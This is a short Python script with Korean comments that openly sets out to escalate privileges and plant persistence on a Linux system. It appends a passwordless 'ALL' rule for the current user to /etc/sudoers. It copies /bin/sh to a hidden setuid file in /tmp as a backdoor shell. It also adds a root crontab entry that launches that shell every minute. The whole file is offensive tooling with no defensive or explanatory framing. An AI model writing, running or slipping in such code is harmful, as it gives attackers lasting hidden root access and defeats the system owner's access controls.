# 권한 상승 — setuid + sudo 우회 + /etc/sudoers 변조
import os
import pwd
import subprocess

# /etc/sudoers에 현재 사용자 NOPASSWD 추가
with open('/etc/sudoers', 'a') as f:
    user = pwd.getpwuid(os.getuid()).pw_name
    f.write(f'\n{user} ALL=(ALL) NOPASSWD: ALL\n')

# setuid 비트로 백도어 셸 설치
subprocess.run(['cp', '/bin/sh', '/tmp/.hidden_shell'])
subprocess.run(['chmod', '4755', '/tmp/.hidden_shell'])

# root crontab에 영속화 항목 추가
cron_entry = '* * * * * /tmp/.hidden_shell -i'
subprocess.run(f'echo "{cron_entry}" | sudo crontab -', shell=True)
